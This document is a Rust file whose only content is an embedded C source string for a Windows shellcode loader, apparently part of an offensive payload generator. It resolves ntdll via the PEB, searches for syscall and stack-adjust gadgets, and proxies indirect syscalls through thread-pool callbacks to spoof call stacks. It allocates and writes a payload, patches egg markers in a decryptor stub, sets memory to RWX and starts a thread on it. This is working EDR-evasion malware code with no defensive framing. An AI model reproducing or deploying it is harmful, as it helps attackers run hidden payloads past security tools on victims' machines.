pub const CAROKANNSPOOFSTACKSLOCALINJ_C: &str = r#"
#include "../include/CarokannSpoofstacksLocalInj.h"
#include <stdio.h>
#include <windows.h>

HMODULE GetNtdllHandle()
{
#if defined(_WIN64)
        PPEB Peb = (PPEB)__readgsqword(0x60);
#else
        PPEB Peb = (PPEB)__readfsdword(0x30);
#endif

        PLDR_MODULE pLoadModule;
        pLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 16);

        return (HMODULE)pLoadModule->BaseAddress;
}

LAUNCHER_STATUS CaroKannCustomCallStacksCommonInj(IN PVOID pBuffer, IN DWORD sBufferSize, IN PBYTE pCustomPayload,
                                                  IN SIZE_T sCustomPayloadSize, IN PNTAPI_FUNC g_Nt)
{
        if (pBuffer == NULL || sBufferSize == 0 || g_Nt == NULL)
        {
                printf("[!] Invalid Parameter\n");
                return LAUNCHER_STATUS_INVALID_PARAMETER;
        }

        SIZE_T ssBufferSize = sBufferSize;
        SIZE_T sssBufferSize = sBufferSize;
        SIZE_T ssCustomPayloadSize = sCustomPayloadSize;
        NTSTATUS STATUS = 0;
        DWORD dwOld = 0;
        SIZE_T sNumberOfBytesWritten = 0;
        HANDLE hThread = NULL, hProcess = (HANDLE)-1;
        PVOID pAddress = NULL;
        PVOID pCustomPayloadAddress = NULL;

        FARPROC pTpAllocWork = g_Nt->TpAllocWork.pSyscallAddress;
        FARPROC pTpPostWork = g_Nt->TpPostWork.pSyscallAddress;
        FARPROC pTpReleaseWork = g_Nt->TpReleaseWork.pSyscallAddress;

        PTP_WORK WorkReturn = NULL;

        NTALLOCATEVIRTUALMEMORY_ARGS NtAllocateVirtualMemoryArgs = {0};
        NTWRITEVIRTUALMEMORY_ARGS NtWriteVirtualMemoryArgs = {0};
        NTPROTECTVIRTUALMEMORY_ARGS NtProtectVirtualMemoryArgs = {0};
        NTCREATETHREADEX_ARGS NtCreateThreadExArgs = {0};

        HANDLE hNtdll = GetNtdllHandle();
        Search_For_Syscall_Ret(hNtdll);
        Search_For_Add_Rsp_Ret(hNtdll);

        NtAllocateVirtualMemoryArgs.hProcess = hProcess;
        NtAllocateVirtualMemoryArgs.address = &pAddress;
        NtAllocateVirtualMemoryArgs.zeroBits = 0;
        NtAllocateVirtualMemoryArgs.size = &sssBufferSize;
        NtAllocateVirtualMemoryArgs.allocationType = (MEM_COMMIT | MEM_RESERVE);
        NtAllocateVirtualMemoryArgs.permissions = PAGE_READWRITE;
        NtAllocateVirtualMemoryArgs.ssn = g_Nt->NtAllocateVirtualMemory.dwSSn;

        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)CBNtAllocateVirtualMemory,
                                    &NtAllocateVirtualMemoryArgs, NULL);
        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

        WaitForSingleObject((HANDLE)-1, 0x1000);
        printf("[+] Main Payload Allocated Address: %p\n", pAddress);

        NtWriteVirtualMemoryArgs.hProcess = hProcess;
        NtWriteVirtualMemoryArgs.address = pAddress;
        NtWriteVirtualMemoryArgs.buffer = pBuffer;
        NtWriteVirtualMemoryArgs.numberOfBytesToWrite = ssBufferSize;
        NtWriteVirtualMemoryArgs.numberOfBytesWritten = &sNumberOfBytesWritten;
        NtWriteVirtualMemoryArgs.ssn = g_Nt->NtWriteVirtualMemory.dwSSn;

        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)CBNtWriteVirtualMemory, &NtWriteVirtualMemoryArgs,
                                    NULL);
        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

        WaitForSingleObject((HANDLE)-1, 0x1000);
        printf("[+] Main Payload Bytes Written : %d\n", sNumberOfBytesWritten);
        printf("\t(i) Start Patch CustomShellCode (ProtectDecryptAddress)...\n");
        int eggIndex = 0;
        for (int i = 0; i < sCustomPayloadSize; i++)
        {
                if (pCustomPayload[i] == 0x88 && pCustomPayload[i + 1] == 0x88 && pCustomPayload[i + 2] == 0x88 &&
                    pCustomPayload[i + 3] == 0x88 && pCustomPayload[i + 4] == 0x88 && pCustomPayload[i + 5] == 0x88 &&
                    pCustomPayload[i + 6] == 0x88 && pCustomPayload[i + 7] == 0x88)
                {
                        printf("\t(i) Detect Bad Char (ProtectDecryptAddress)\n");
                        eggIndex = i;
                        break;
                }
        };
        memcpy((void *)&pCustomPayload[eggIndex], &pAddress, 8);

        printf("\t(i) Start Patch CustomShellCode (JumpAddress)...\n");
        eggIndex = 0;
        for (int i = 0; i < sCustomPayloadSize; i++)
        {
                if (pCustomPayload[i] == 0x49 && pCustomPayload[i + 1] == 0xBA && pCustomPayload[i + 2] == 0x00 &&
                    pCustomPayload[i + 3] == 0x00 && pCustomPayload[i + 4] == 0x00 && pCustomPayload[i + 5] == 0x00 &&
                    pCustomPayload[i + 6] == 0x00 && pCustomPayload[i + 7] == 0x00 && pCustomPayload[i + 8] == 0x00 &&
                    pCustomPayload[i + 9] == 0x00 && pCustomPayload[i + 10] == 0x41 && pCustomPayload[i + 11] == 0xFF &&
                    pCustomPayload[i + 12] == 0xE2)
                {
                        printf("\t(i) Detect Bad Char (JumpAddress)\n");
                        eggIndex = i + 2;
                        break;
                }
        };
        memcpy((void *)&pCustomPayload[eggIndex], &pAddress, 8);

        printf("\t(i) Start Patch CustomShellCode (Length)...\n");
        eggIndex = 0;
        for (int i = 0; i < sCustomPayloadSize; i++)
        {
                if (pCustomPayload[i] == 0xDE && pCustomPayload[i + 1] == 0xAD && pCustomPayload[i + 2] == 0x10 &&
                    pCustomPayload[i + 3] == 0xAF)
                {
                        printf("\t(i) Detect Bad Char (Length)\n");
                        eggIndex = i;
                        break;
                }
        };

        memcpy((void *)&pCustomPayload[eggIndex], (void *)&ssBufferSize, 8);
        NtAllocateVirtualMemoryArgs.hProcess = hProcess;
        NtAllocateVirtualMemoryArgs.address = &pCustomPayloadAddress;
        NtAllocateVirtualMemoryArgs.zeroBits = 0;
        NtAllocateVirtualMemoryArgs.size = &sCustomPayloadSize;
        NtAllocateVirtualMemoryArgs.allocationType = (MEM_COMMIT | MEM_RESERVE);
        NtAllocateVirtualMemoryArgs.permissions = PAGE_READWRITE;
        NtAllocateVirtualMemoryArgs.ssn = g_Nt->NtAllocateVirtualMemory.dwSSn;

        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)CBNtAllocateVirtualMemory,
                                    &NtAllocateVirtualMemoryArgs, NULL);
        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

        WaitForSingleObject((HANDLE)-1, 0x1000);
        printf("[+] Custom Payload Allocated Address: %p\n", pCustomPayloadAddress);

        NtWriteVirtualMemoryArgs.hProcess = hProcess;
        NtWriteVirtualMemoryArgs.address = pCustomPayloadAddress;
        NtWriteVirtualMemoryArgs.buffer = pCustomPayload;
        NtWriteVirtualMemoryArgs.numberOfBytesToWrite = ssCustomPayloadSize;
        NtWriteVirtualMemoryArgs.numberOfBytesWritten = &sNumberOfBytesWritten;
        NtWriteVirtualMemoryArgs.ssn = g_Nt->NtWriteVirtualMemory.dwSSn;

        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)CBNtWriteVirtualMemory, &NtWriteVirtualMemoryArgs,
                                    NULL);
        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

        WaitForSingleObject((HANDLE)-1, 0x1000);
        printf("[+] Custom Payload Bytes Written : %d\n", sNumberOfBytesWritten);

        NtProtectVirtualMemoryArgs.hProcess = hProcess;
        NtProtectVirtualMemoryArgs.address = &pCustomPayloadAddress;
        NtProtectVirtualMemoryArgs.size = &ssCustomPayloadSize;
        NtProtectVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;
        NtProtectVirtualMemoryArgs.old_permissions = &dwOld;
        NtProtectVirtualMemoryArgs.ssn = g_Nt->NtProtectVirtualMemory.dwSSn;

        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)CBNtProtectVirtualMemory,
                                    &NtProtectVirtualMemoryArgs, NULL);
        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

        WaitForSingleObject((HANDLE)-1, 0x1000);
        printf("[+] Custom Payload Old permissions : %d\n", dwOld);

        NtCreateThreadExArgs.threadHandle = &hThread;
        NtCreateThreadExArgs.desiredAccess = THREAD_ALL_ACCESS;
        NtCreateThreadExArgs.objectAttributes = NULL;
        NtCreateThreadExArgs.processHandle = hProcess;
        NtCreateThreadExArgs.lpStartAddress = pCustomPayloadAddress;
        NtCreateThreadExArgs.lpParameter = NULL;
        NtCreateThreadExArgs.flags = FALSE;
        NtCreateThreadExArgs.stackZeroBits = 0;
        NtCreateThreadExArgs.sizeOfStackCommit = 0;
        NtCreateThreadExArgs.sizeOfStackReserve = 0;
        NtCreateThreadExArgs.ssn = g_Nt->NtCreateThreadEx.dwSSn;

        ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)CBNtCreateThreadEx, &NtCreateThreadExArgs, NULL);
        ((TPPOSTWORK)pTpPostWork)(WorkReturn);
        ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

        WaitForSingleObject((HANDLE)-1, 0x1000);

        printf("[+] Thread Created : %d\n", GetThreadId(hThread));
        // waiting for the payload
        SET_SYSCALL(g_Nt->NtWaitForSingleObject);
        if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00)
        {
                printf("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
                return LAUNCHER_STATUS_FAILED;
        }
        return LAUNCHER_STATUS_SUCCESS;
}
"#;
